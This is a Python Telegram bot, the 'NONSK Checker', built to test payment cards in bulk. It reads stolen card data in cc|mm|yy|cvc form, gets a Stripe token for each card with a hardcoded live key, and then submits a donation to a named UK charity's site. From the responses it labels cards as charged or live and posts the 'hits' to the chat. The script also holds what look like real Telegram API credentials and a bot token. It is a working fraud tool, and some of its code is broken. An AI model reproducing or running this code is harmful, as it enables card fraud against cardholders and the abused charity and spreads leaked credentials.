from pyrogram import Client, filters
import time
import requests
import json
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# Bot Configuration
API_ID = "28271744"
API_HASH = "1df4d2b4dc77dc5fd65622f9d8f6814d"
BOT_TOKEN = "7393878224:AAGTFjEclUdXYI0NzaRUUqmRUwFrNBhYVKo"
app = Client("nonsk_checker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

users = set()  # To store registered users

@app.on_message(filters.command("start"))
def start(client, message):
    message.reply(
        "👋 **Welcome to NONSK Checker Bot!**\n\n"
        "🔑 Use /register to access the bot.\n"
        "ℹ️ Use /help to learn how to check cards.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Contact Support", url="https://t.me/your_support")]
        ])
    )

@app.on_message(filters.command("register"))
def register(client, message):
    user_id = message.from_user.id
    if user_id in users:
        message.reply("✅ **You are already registered!**")
    else:
        users.add(user_id)
        message.reply("🎉 **Registration successful!** You can now use the bot commands.")

@app.on_message(filters.command("help"))
def help_command(client, message):
    message.reply(
        "ℹ️ **NONSK Checker Bot Help**\n\n"
        "📄 **Commands:**\n"
        "• /chk - Reply to a .txt file with card details to check.\n"
        "• /register - Register yourself to use the bot.\n"
        "• /help - Show this help message.\n\n"
        "💡 **How to use /chk:**\n"
        "1. Upload a .txt file containing card details in the format `cc|mm|yy|cvc`.\n"
        "2. Reply to the file with /chk.\n"
        "3. The bot will check the cards and show live progress.\n\n"
        "For any issues, contact support."
    )

@app.on_message(filters.command("chk") & filters.reply)
def chk_command(client, message):
    if message.from_user.id not in users:
        message.reply("❌ **You need to register first using /register.**")
        return

    if not message.reply_to_message.document:
        message.reply("❌ **Please reply to a valid .txt file containing card details.**")
        return

    # Download file
    file_path = message.reply_to_message.download()
    with open(file_path, "r") as file:
        cards = file.read().strip().splitlines()

    if not cards:
        message.reply("❌ **No card details found in the file.**")
        return

    total_cards = len(cards)
    live, dead, hits = [], [], []
    start_time = time.time()

    # Initial message
    msg = message.reply(
        f"↯ **NONSK CHECKER**\n\n"
        f"🔄 **Starting Check...**\n\n"
        f"🟢 Total Cards: {total_cards}\n"
        f"Checked: 0\n"
        f"Live: 0\n"
        f"Dead: 0\n",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Hits 💳", callback_data="send_hits")]
        ])
    )

    for i, card in enumerate(cards):
        result = check_card_details(card)

        # Update live/dead lists
        if "CHARGED✅" in result or "CVV LIVE❎" in result or "CCN LIVE❎" in result or "Approved" in result:
            live.append(card)
            hits.append(f"CC: {card}\n{result}")
            client.send_message(
                message.chat.id,
                f"⚡ **HIT FOUND!** ⚡\n\n"
                f"CC: {card}\n"
                f"Result: {result}\n"
                f"Checked by: {message.from_user.username}"
            )
        else:
            dead.append(card)

        # Update progress message
        app.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=(
                f"↯ **NONSK CHECKER**\n\n"
                f"🔄 **Gateway: Stripe [Oneummah]**\n\n"
                f"📊 **Progress**:\n"
                f"• Checked: {i + 1}/{total_cards}\n"
                f"• Live: {len(live)}\n"
                f"• Dead: {len(dead)}\n\n"
                f"🕒 **Elapsed Time:** {time.time() - start_time:.2f} seconds"
            )
        )

    # Final summary
    summary = (
        f"✅ **Check Completed**\n\n"
        f"🔢 Total Cards: {total_cards}\n"
        f"✔️ Live: {len(live)}\n"
        f"❌ Dead: {len(dead)}\n\n"
        f"🎯 Hits: {len(hits)}"
    )
    app.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=summary)
    if hits:
        app.send_message(message.chat.id, f"💳 **All Hits** 💳\n\n" + "\n\n".join(hits))

def check_card_details(card):
    try:
        cc, mes, ano, cvv = card.split('|')
        if len(mes) == 1:
            mes = "0" + mes
        if len(ano) == 2:
            ano = "20" + ano

        # Stripe Token Request
        token_url = "https://api.stripe.com/v1/tokens"
        headers_1 = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data_1 = {
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "key": "pk_live_oeBlScsEPKeBvHnRXizVNSl4"
        }
        response_1 = requests.post(token_url, headers=headers_1, data=data_1)
        result_1 = response_1.json()

        if "error" in result_1:
            return f"DEAD\nMessage: {result_1['error']['message']}"

        token_id = result_1.get("id", "")
        donation_url = "https://oneummah.org.uk/wp-admin/admin-ajax.php"
        headers_2 = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data_2 = {
            "action": "k14_submit_donation",
            "token": token_id
        }
        response_2 = requests.post(donation_url, headers=headers_2, data=data_2)
        result_2 = response_2.text

        # Check response_2 for various key statuses
        if "payment_intent_unexpected_state" in result_2:
            return "Payment Intent Confirmed"
        elif "succeeded" in result_2:
            return "CHARGED✅"
        elif "Your card has insufficient funds." in result_2:
            return "INSUFFICIENT FUNDS❎"
        elif "incorrect_zip" in result_2:
            return "CVV LIVE❎"
        elif "Your card's security code is invalid." in result_2:
            return "CCN LIVE❎"
        elif "redirect_url" in result_2:
            return "Approved\n3DS Required❎"
        elif "Thank you for your donation" in result_2:
            return "CHARGED✅"
        else:
            return "DEAD"

    except Exception as e:
        return f"An error occurred: {str(e)}"

@app.on_callback_query(filters.regex("send_hits"))
def send_hits(client, callback_query):
    if not hits:
        callback_query.answer("No hits found yet.", show_alert=True)
    else:
        callback_query.message.reply("💳 **Hits Summary** 💳\n\n" + "\n\n".join(hits))

app.run()
